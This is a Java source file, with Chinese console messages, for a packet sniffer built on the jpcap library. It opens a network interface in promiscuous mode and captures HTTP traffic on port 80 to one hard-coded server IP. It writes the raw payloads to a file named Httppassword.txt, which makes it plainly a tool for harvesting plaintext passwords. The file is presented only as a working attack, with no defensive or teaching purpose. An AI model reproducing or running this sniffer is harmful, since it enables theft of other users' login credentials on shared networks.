package jpcap;
import java.io.BufferedWriter;
import java.io.FileWriter;
import java.io.IOException;
import java.net.InetAddress;
import java.net.UnknownHostException;

import jpcap.packet.Packet;
import jpcap.packet.TCPPacket;

 
public class httppassword implements PacketReceiver{
 
 public void receivePacket(Packet p) {
  if(p instanceof TCPPacket )
  {
    TCPPacket t =(TCPPacket)p;
       String s = t.toString();
       //System.out.println("tou "+s);
         
   try { //t.dst_ip.equals(ip) &&
 
      InetAddress ip = InetAddress.getByName("202.202.15.238");
      if( t.dst_port==80 && t.dst_ip.equals(ip))
      {
 
 
       System.out.println("tou "+s);
       BufferedWriter httpout =
        new BufferedWriter(new FileWriter("c:\\Httppassword.txt", true));
      httpout.write(s);
      httpout.newLine();
      for(int i=0;i<t.data.length;i++)
      {
       httpout.write((char)t.data[i] );
      }
      httpout.close();
         }
   } catch (UnknownHostException e) {
    // TODO Auto-generated catch block
 
    e.printStackTrace();
   } catch (IOException e) {
    // TODO Auto-generated catch block
 
    e.printStackTrace();
   }
     
       
  }
   
   
   
 }
  
 public static void main(String[] args) throws IOException {
  NetworkInterface[] devices = jpcap.JpcapCaptor.getDeviceList();
  for(int i=0;i<devices.length;i++){
         
            
            System.out.println("DEVICES "+i+":");
 
            System.out.println("name:\t"+devices[i].name);
 
            System.out.println("description:\t"+devices[i].description);
 
            System.out.println("datalink_name:\t"+devices[i].datalink_name);
 
                   System.out.println("datalink_description:\t"+devices[i].datalink_description);
 
            System.out.println("mac_address:\t");
 
            for(int j=0;j<devices[i].mac_address.length;j++){
 
               System.out.print(Integer.toHexString(devices[i].mac_address[j]&0xff) + ":");
            }
 
            System.out.println();
 
            System.out.println("NetworkInterfaceAddress:\t");
            System.out.println("devices[i].addresses.length:\t"+devices[i].addresses.length);
 
            for(int j=0;j<devices[i].addresses.length;j++){
                  
             System.out.println("address:\t"+devices[i].addresses[j].address);
               
             System.out.println("broadcast:\t"+devices[i].addresses[j].broadcast);
                  
           System.out.println("destination:\t"+devices[i].addresses[j].destination);
            System.out.println("subnet:\t"+devices[i].addresses[j].subnet);
 
            }
 
     }
    System.out.println("抓包开始，请注意c盘Httpassword.txt文件的内容变化");
    System.out.println();
    System.out.println("如果没有创建txt文件，请在c:盘自己创建txt文件");
  
   JpcapCaptor cap = jpcap.JpcapCaptor.openDevice(devices[1],65000,true,10000);
             cap.loopPacket(-1,new httppassword ());
     
  }
 
}